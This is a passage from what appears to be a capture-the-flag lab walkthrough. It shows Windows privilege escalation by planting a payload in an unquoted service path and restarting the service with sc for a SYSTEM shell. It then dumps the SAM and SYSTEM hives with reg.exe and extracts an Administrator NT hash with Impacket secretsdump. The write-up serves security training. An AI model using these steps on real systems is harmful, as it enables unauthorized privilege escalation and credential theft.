Let's add some evasion so that a GUI isn't created on startup.

```cs
procInfo.CreateNoWindow = true;
```

Compile with Mono.

Transfer the payload onto the target using curl and an http server like we did for netcat.

We now need to transfer the file into the correct path.

```
C:\Program Files (x86)\System Explorer\System Explorer\service\SystemExplorerService64.exe
C:\Program Files (x86)\System Explorer\System.exe
```

We can see the second one would work because the filepath is unquoted. Rename your payload to System.exe and put it there.

Remember this is a network so check to see if someone else is already doing this. If they are, wait for their binary to dissapear.

Now with the binary in place, restart the service!

```
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
```

### Win! we should get a shell back as system!

Let's go ahead and clean it up now that we have our shell.

```
del "C:\Program Files (x86)\System Explorer\System.exe"
sc start SystemExplorerHelpService
```

Another [interesting wrapper](https://github.com/mattymcfatty/unquotedPoC) that doesn't error out the sc start command for the shell.

## Task 43: [Exfiltration] Exfiltration Techniques & Post Exploitation

Now that we have owned the network, we can move on to the final stage.

Read the information on Data Exfil and Post Exploitation to answer the questions.

Let's go ahead and get the local user hashes from the hive, **HKEY_LOCAL_MACHINE\SAM**.

* Save the SAM hive which will be in the current directory as sam.bak.

```
reg.exe save HKLM\SAM sam.bak
```

* SYSTEM hive for the boot key.

```
reg.exe save HKLM\SYSTEM system.bak
```

* Transfer the files to your attacking VM, I used [Impacket](https://github.com/SecureAuthCorp/impacket) and a SMB server.

* I also used Impacket to dump the hashes with secretsdump.py.

```
python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
Impacket v0.9.23.dev1+20210302.130123.df00d15c - Copyright 2020 SecureAuth Corporation

[*] Target system bootkey: 0xfce6f31c003e4157e8cb1bc59f4720e6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a05c3c807ceeb48c472568da284cd2:::
```

**1) What is the Administrator NT hash for this target?**

Secretsdump gave us this, let's go back and clean up our artifacts we left behind.

### Congratulations! You're done with the room!

## Mitigations (coming soon)

### Initial Access

### Privilege Escalation

Feel free to reach out to me on [Twitter](https://twitter.com/R_G_9_n) if you have any questions.
